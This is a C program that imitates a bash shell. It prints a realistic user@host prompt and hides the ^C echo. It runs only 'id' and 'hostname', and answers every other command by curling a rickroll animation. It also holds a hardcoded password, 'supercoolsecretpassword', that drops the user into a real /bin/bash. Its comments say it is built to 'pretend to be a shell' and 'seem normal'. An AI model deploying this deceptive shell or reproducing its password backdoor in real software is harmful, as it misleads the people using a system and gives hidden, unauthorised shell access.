#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
#include <signal.h>
#include <termios.h>
#include <errno.h>

static struct termios orig_termios;
static int termios_saved = 0;
static volatile sig_atomic_t got_sigint = 0;

/* THIS CODE BLOCK HANDLES TURNING OFF ECHOCTL TO PROVIDE A MASK*/

void restore_terminal(void) {
    if (termios_saved) {
        tcsetattr(STDIN_FILENO, TCSANOW, &orig_termios);
    }
}

void disable_echoctl(void) {
    struct termios t;

    if (tcgetattr(STDIN_FILENO, &orig_termios) == -1) {
        return;
    }
    termios_saved = 1;
    t = orig_termios;
#ifdef ECHOCTL
    t.c_lflag &= ~ECHOCTL;
    tcsetattr(STDIN_FILENO, TCSANOW, &t);
#endif
}

void sigint_handler(int sig) {
    (void)sig;
    got_sigint = 1;
    write(STDOUT_FILENO, "\n", 1);
}

/* END OF ECHOCTL CODE BLOCK */

int main() {
    char *line = NULL;
    size_t cap = 0;

    // get session information (username, hostname) to print with the prompt
    char* username = getenv("USER");
    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    disable_echoctl();
    atexit(restore_terminal);

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);

    while (1) {
        // wait for input, pretend to be a shell
        printf("%s@%s:%s$ ", username, hostname, getenv("PWD"));
        fflush(stdout);

        ssize_t bytes_read = getline(&line, &cap, stdin);
        if (bytes_read == -1) {
            if (errno == EINTR || got_sigint) {
                clearerr(stdin);
                got_sigint = 0;
                continue;
            }
            free(line);
            return 1;
        }

        if (bytes_read > 0 && line[bytes_read - 1] == '\n') {
            line[bytes_read - 1] = '\0';
        }

        if (line[0] == '\0') {
            continue;
        }

        int status = 0;

        // check for cool password here to be able to replace current process
        if (strcmp(line, "supercoolsecretpassword") == 0) {
            execv("/bin/bash", NULL);
        }
        
        // we need to keep our parent process running to seem normal so we 
        // use a normal fork, waitpid loop
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork");
            continue;
        }

        if (strcmp(line, "exit") == 0) {
            _exit(0);
        }

        if (pid == 0) {
            if (strcmp(line, "id") == 0) {
                char *id_argv[] = {"id", NULL};
                execv("/usr/bin/id", id_argv);
            } else if (strcmp(line, "hostname") == 0) {
                char *hostname_argv[] = {"hostname", NULL};
                execv("/usr/bin/hostname", hostname_argv);
            } else {
                char *curl_argv[] = {"curl", "ascii.live/rick", NULL};
                execv("/usr/bin/curl", curl_argv);
            }

            perror("execv");
            _exit(1);
        }

        waitpid(pid, NULL, 0);
        if (status == 1) {
            break;
        }
    }

    free(line);
    return 0;
}
             